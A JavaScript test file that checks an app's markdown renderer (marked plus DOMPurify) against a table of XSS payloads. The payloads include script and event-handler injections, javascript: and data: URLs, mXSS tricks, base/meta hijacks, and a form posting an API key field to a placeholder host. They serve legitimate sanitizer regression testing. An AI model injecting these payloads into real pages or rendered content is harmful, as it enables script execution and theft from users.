// SPDX-License-Identifier: AGPL-3.0-or-later
// Drives the shipped renderMarkdown against the real vendored marked,
// DOMPurify, highlight.js, KaTeX and auto-render, in place of the harness stubs.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { loadApp } from "./harness.mjs";

const VENDOR = new URL("../localm/plugins/gui/static/vendor/", import.meta.url);
const readVendored = (n) => fs.readFileSync(new URL(n, VENDOR), "utf8");

/** loadApp(), then replace harness.mjs's vendor stubs with the real vendored
 *  bytes, loaded as classic scripts in the same realm. helpers.js resolves
 *  `marked` / `DOMPurify` as globals at CALL time, so swapping them after load
 *  is enough. marked.setOptions() ran at load against the stub, so it is
 *  re-applied here with the same options helpers.js uses. */
function loadRealPipeline({ withSanitizer = true } = {}) {
  const { window: win } = loadApp();
  for (const f of ["marked.min.js", "purify.min.js", "highlight.min.js",
                   "katex.min.js", "auto-render.min.js"]) {
    const tag = win.document.createElement("script");
    tag.textContent = readVendored(f);
    win.document.head.appendChild(tag);
  }
  assert.equal(typeof win.marked.parse, "function", "real marked did not load");
  assert.equal(typeof win.DOMPurify.sanitize, "function", "real DOMPurify did not load");
  win.marked.setOptions({ breaks: true, mangle: false, headerIds: false });
  if (!withSanitizer) win.DOMPurify = { sanitize: (s) => s };   // control arm only
  return win;
}

// Payload classes: raw-HTML passthrough, URL schemes markdown can carry, the
// rawtext-element family, mXSS/namespace confusion, and document-scope hijacks.
const PAYLOADS = {
  "raw script element":      "<script>window.__xss=1<\/script>",
  "img onerror":             '<img src=x onerror="window.__xss=1">',
  "svg onload":              '<svg onload="window.__xss=1"></svg>',
  "body onload":             '<body onload="window.__xss=1">',
  "input autofocus onfocus": '<input autofocus onfocus="window.__xss=1">',
  "markdown javascript:":    "[click](javascript:window.__xss=1)",
  "markdown image js:":      "![x](javascript:window.__xss=1)",
  "markdown data:text/html": "[c](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3M9MTwvc2NyaXB0Pg==)",
  "html-entity javascript:": "[x](jav&#x61;script:window.__xss=1)",
  "iframe srcdoc":           '<iframe srcdoc="&lt;script&gt;parent.__xss=1&lt;/script&gt;"></iframe>',
  "noscript rawtext":        '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>">',
  "xmp rawtext":             "<xmp></xmp><img src=x onerror=window.__xss=1>",
  "noembed rawtext":         "<noembed><img src=x onerror=window.__xss=1></noembed>",
  "svg/style mXSS":          "<svg></p><style><a id=\"</style><img src=1 onerror=window.__xss=1>\">",
  "mathml annotation-xml":   '<math><annotation-xml encoding="text/html"><img src=x onerror=window.__xss=1>',
  "form + formaction":       '<form action="javascript:window.__xss=1"><button formaction="javascript:window.__xss=1">x',
  "base hijack":             "<base href='https://example.invalid/'>",
  "meta refresh":            '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">',
  "template smuggle":        "<template><img src=x onerror=window.__xss=1></template>",
  "object/embed":            '<object data="javascript:window.__xss=1"></object><embed src="x.swf">',
};

// FORM is not in this set: DOMPurify's default ALLOWED_TAGS includes it.
const HIJACK_TAGS = /^(SCRIPT|IFRAME|OBJECT|EMBED|BASE|META)$/;

/** Every executable or document-hijacking artefact left in a rendered subtree,
 *  read off the DOM rather than the sanitizer's output string. */
function liveThreats(root) {
  const found = [];
  root.querySelectorAll("*").forEach((n) => {
    for (const a of n.attributes) {
      if (/^on/i.test(a.name)) found.push(`${n.tagName}[${a.name}]`);
      if (/^(href|src|action|formaction|srcdoc|data)$/i.test(a.name)
          && /^\s*(javascript|vbscript|data:text\/html)/i.test(a.value)) {
        found.push(`${n.tagName}[${a.name}="${a.value.slice(0, 24)}"]`);
      }
    }
    if (HIJACK_TAGS.test(n.tagName)) found.push(`<${n.tagName}>`);
  });
  return found;
}

function render(win, text) {
  const target = win.document.createElement("div");
  win.document.body.appendChild(target);
  win.renderMarkdown(target, text, { final: true });
  return target;
}

test("no payload survives renderMarkdown as an executable or hijacking node", () => {
  const win = loadRealPipeline();
  const survivors = {};
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    const threats = liveThreats(render(win, payload));
    if (threats.length) survivors[name] = threats;
  }
  assert.deepEqual(survivors, {},
    "renderMarkdown left executable or document-hijacking nodes in the DOM. "
    + "Each key is a payload class that got through the marked -> DOMPurify "
    + "pipeline at helpers.js:290.");
  assert.equal(win.__xss, undefined, "a payload actually executed during render");
});

test("the <think> block sink is sanitized on the same terms as the main body", () => {
  // helpers.js:276 is a second innerHTML sink, fed by splitThink()
  const win = loadRealPipeline();
  const survivors = {};
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    const target = render(win, `<think>${payload}</think>visible answer`);
    const det = target.querySelector("details.think-block");
    assert.ok(det, `no think block was produced for payload: ${name}`);
    const threats = liveThreats(det);
    if (threats.length) survivors[name] = threats;
  }
  assert.deepEqual(survivors, {},
    "the think-block sink (helpers.js:276) let a payload through");
  assert.equal(win.__xss, undefined, "a payload executed while rendering a think block");
});

test("both sinks write into a normal HTML element, never a rawtext one", () => {
  // the rawtext class needs the sanitizer's output re-parsed inside a rawtext
  // element; both render destinations are plain <div>s
  const RAWTEXT = new Set(["NOSCRIPT", "XMP", "NOEMBED", "NOFRAMES", "IFRAME",
                           "TEXTAREA", "TITLE", "STYLE", "SCRIPT", "PLAINTEXT"]);
  const win = loadRealPipeline();
  const target = render(win, "<think>reasoning</think>body text");
  const main = target.querySelector(".md-main");
  const think = target.querySelector("details.think-block div");
  assert.ok(main && think, "expected both render destinations to exist");
  for (const [what, node] of [["main body (helpers.js:290)", main],
                              ["think block (helpers.js:276)", think]]) {
    assert.equal(node.tagName, "DIV", `${what} destination is <${node.tagName}>, expected DIV`);
    assert.ok(!RAWTEXT.has(node.tagName), `${what} writes into a rawtext element`);
    // a rawtext ancestor would re-parse the subtree just the same
    for (let p = node.parentElement; p; p = p.parentElement) {
      assert.ok(!RAWTEXT.has(p.tagName),
        `${what} has a rawtext ancestor <${p.tagName}>, which reopens the `
        + "rawtext re-parse class this call site is otherwise immune to");
    }
  }
});

test("ordinary markdown still renders (the sanitizer is not just eating everything)", () => {
  const win = loadRealPipeline();
  const t = render(win, "# Heading\n\n**bold** and `code`\n\n- item\n\n[link](https://example.com)");
  assert.ok(t.querySelector("h1"), "heading was lost");
  assert.ok(t.querySelector("strong"), "bold was lost");
  assert.ok(t.querySelector("code"), "inline code was lost");
  assert.ok(t.querySelector("li"), "list item was lost");
  const a = t.querySelector("a");
  assert.ok(a, "link was lost");
  assert.equal(a.getAttribute("href"), "https://example.com",
    "a safe https link must survive sanitisation intact");
});

test("renderMarkdown opens changelog-shaped reference links in a new tab", () => {
  // CHANGELOG.md's own footer format: "[0.1.5]: https://github.com/...".
  const win = loadRealPipeline();
  const t = render(win,
    "## [0.1.5] - 2026-08-20\n\nSee the [0.1.5] release on GitHub.\n\n"
    + "[0.1.5]: https://github.com/Matlan1/localm/releases/tag/v0.1.5");
  const a = t.querySelector("a");
  assert.ok(a, "reference-style link was lost");
  assert.equal(a.getAttribute("href"),
    "https://github.com/Matlan1/localm/releases/tag/v0.1.5");
  assert.equal(a.getAttribute("target"), "_blank",
    "a changelog link must open in a new tab, not navigate the app window away "
    + "(the native window has no address bar or back button)");
  assert.equal(a.getAttribute("rel"), "noopener",
    "a target=_blank link must carry rel=noopener");
});

test("renderMarkdown opens chat-reply-shaped inline links in a new tab too", () => {
  // The same renderer serves chat replies, so an ordinary [text](url) link
  // must get the same treatment as the changelog's reference-style ones.
  const win = loadRealPipeline();
  const t = render(win, "See [the localm repo](https://github.com/Matlan1/localm) for details.");
  const a = t.querySelector("a");
  assert.ok(a, "inline link was lost");
  assert.equal(a.getAttribute("href"), "https://github.com/Matlan1/localm");
  assert.equal(a.getAttribute("target"), "_blank");
  assert.equal(a.getAttribute("rel"), "noopener");
});

test("a link inside a <think> block also opens in a new tab", () => {
  const win = loadRealPipeline();
  const t = render(win, "<think>see [source](https://example.com)</think>done");
  const det = t.querySelector("details.think-block");
  assert.ok(det, "no think block was produced");
  const a = det.querySelector("a");
  assert.ok(a, "think-block link was lost");
  assert.equal(a.getAttribute("target"), "_blank");
  assert.equal(a.getAttribute("rel"), "noopener");
});

test("a model-authored <form> survives sanitisation, so the CSP must confine it", () => {
  // Pins the PREMISE of the `form-action 'none'` CSP directive rather than the
  // directive itself (jsdom enforces no CSP). If a future DOMPurify starts
  // stripping <form> or its action, this goes red and whoever sees it should
  // re-read the form-action rationale in http_server.py rather than assume the
  // directive is still earning its place - the failure mode this guards against
  // is a directive outliving the reason anyone can still find for it.
  const win = loadRealPipeline();
  const t = render(win,
    '<form action="https://example.invalid/collect" method="post">'
    + '<input name="apikey"><button>Verify</button></form>');
  const f = t.querySelector("form");
  assert.ok(f, "DOMPurify no longer passes <form> through - re-read the "
    + "form-action 'none' rationale in http_server.py's _CSP_SUFFIX and in "
    + "helpers.js artifactSrcdoc, which both cite this as their reason.");
  assert.equal(f.getAttribute("action"), "https://example.invalid/collect",
    "a remote form action no longer survives sanitisation - same note as above");
  // The half the sanitizer DOES handle, so the two are not confused:
  const js = render(win, '<form action="javascript:window.__xss=1"><button>x</button></form>');
  assert.equal(js.querySelector("form").getAttribute("action"), null,
    "a javascript: form action must still be stripped by the sanitizer");
});

test("CONTROL: without DOMPurify the very same payloads DO go live", () => {
  // This test exists so the four above cannot pass vacuously. If the payload
  // table stopped reaching the renderer, or liveThreats() stopped detecting
  // anything, this control would go green-when-it-should-be-red and the failure
  // would be visible HERE rather than hiding as a clean pass everywhere else.
  const win = loadRealPipeline({ withSanitizer: false });
  const wentLive = [];
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    if (liveThreats(render(win, payload)).length) wentLive.push(name);
  }
  assert.ok(wentLive.length >= 10,
    `only ${wentLive.length} of ${Object.keys(PAYLOADS).length} payloads produced a `
    + "live threat with the sanitizer removed. The detector or the payload table "
    + "has decayed, so the passing results above prove nothing. Live: "
    + JSON.stringify(wentLive));
});
